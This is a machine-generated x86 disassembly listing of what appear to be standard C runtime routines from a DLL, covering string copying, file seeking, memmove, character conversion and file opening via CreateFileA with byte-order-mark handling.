dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1001034f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001830b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1001034f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
sub_10018380
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100183c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001840b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1000c185
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100183c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10017ec8
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100184c3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10019872
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1001034f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_10010375
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10018548
push 0x14
push r--data
call sub_10011e54
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
call sub_1001034f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10010362
mov [ eax ] edi
call sub_1001034f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100184c3
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018657
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10018661
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10015982
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100186aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1001034f
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_1001870e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1001034f
mov [ eax ] 0x2a
call sub_1001034f
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1001034f
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1000ebe0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1000ebe0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_100188a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10018928 ]
jmp [ ecx * 4 + jump_table_100189a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018a14 ]
pop esi
pop edi
pop ebp
jmp sub_1001a1c2
jmp [ ecx * 4 + jump_table_10018bb0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10018ab4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018bb0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10018a14 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10018bb0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018a14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018a14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018a14 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018bb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018bb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018bb0 ]
sub_10018c05
push 0x10
push r--data
call sub_10011e54
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018c9b
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1000cd16
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000c3e9
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_10018ca4
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_1001aece
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_10010362
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_100199b0
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_10010362
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1001034f
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_1001034f
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_10010375
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_10010375
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1001034f
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_1001976b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_100143a7
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_10012872
add esp 0xc
test eax eax
jne r-xdata
call sub_10010362
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_100143a7
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_10013081
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_10010375
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_100197ec
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_1001ac5c
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_10012872
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100184c3
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100184c3
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_10013081
pop ecx
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_100143a7
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_10013bd6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_100143a7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100184c3
add esp 0x10
